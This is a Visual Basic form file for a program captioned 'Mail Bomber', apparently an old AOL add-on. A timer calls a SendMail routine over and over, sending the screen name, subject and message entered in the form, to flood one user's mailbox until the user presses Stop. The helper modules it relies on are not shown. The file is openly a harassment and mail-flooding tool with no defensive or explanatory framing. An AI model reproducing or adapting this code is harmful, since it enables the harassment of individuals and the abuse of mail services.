VERSION 4.00
Begin VB.Form Form3 
   BackColor       =   &H00FF0000&
   BorderStyle     =   4  'Fixed ToolWindow
   Caption         =   "Mail Bomber"
   ClientHeight    =   3015
   ClientLeft      =   2025
   ClientTop       =   2715
   ClientWidth     =   3495
   Height          =   3480
   Left            =   1965
   LinkTopic       =   "Form3"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   3015
   ScaleWidth      =   3495
   ShowInTaskbar   =   0   'False
   Top             =   2310
   Width           =   3615
   Begin VB.Timer Timer1 
      Enabled         =   0   'False
      Interval        =   10
      Left            =   240
      Top             =   3120
   End
   Begin VB.CommandButton Command2 
      Caption         =   "Start"
      Height          =   255
      Left            =   2160
      TabIndex        =   4
      Top             =   1080
      Width           =   1215
   End
   Begin VB.CommandButton Command1 
      Caption         =   "Stop"
      Height          =   255
      Left            =   2160
      TabIndex        =   3
      Top             =   1080
      Width           =   1215
   End
   Begin VB.TextBox Text3 
      Height          =   1095
      Left            =   120
      MultiLine       =   -1  'True
      ScrollBars      =   2  'Vertical
      TabIndex        =   2
      Text            =   "MailBomb.frx":0000
      Top             =   1800
      Width           =   3255
   End
   Begin VB.TextBox Text2 
      Height          =   285
      Left            =   120
      TabIndex        =   1
      Text            =   "Subject"
      Top             =   1440
      Width           =   3255
   End
   Begin VB.TextBox Text1 
      Height          =   285
      Left            =   120
      TabIndex        =   0
      Text            =   "Screen Name"
      Top             =   1080
      Width           =   1935
   End
   Begin VB.Label Label1 
      BackStyle       =   0  'Transparent
      Caption         =   $"MailBomb.frx":0008
      ForeColor       =   &H00FFFFFF&
      Height          =   855
      Left            =   120
      TabIndex        =   5
      Top             =   120
      Width           =   3255
   End
End
Attribute VB_Name = "Form3"
Attribute VB_Creatable = False
Attribute VB_Exposed = False
Private Sub Command1_Click()
timer1.Enabled = False
Command2.Visible = True
Command1.Visible = False
End Sub

Private Sub Command2_Click()
subbas.IsUserOnline
If subbas.IsUserOnline = 0 Then
MsgBox "Not Online", vbCritical, "Sign On"
End If
If subbas.IsUserOnline = 1 Then
timer1.Enabled = True
Command2.Visible = False
Command1.Visible = True
End If
End Sub


Private Sub Form_Load()
Form1.Hide
FFX.StayOnTop Me
Me.Picture = Form1.Image2.Picture
Top = 0
Left = 0

End Sub

Private Sub Form_Unload(Cancel As Integer)
Form1.Visible = True
Unload Form3
End Sub


Private Sub timer1_Timer()
Jolt.SendMail Text1.Text, text2.Text, Text3.Text
Jolt.timeout 0.7
End Sub


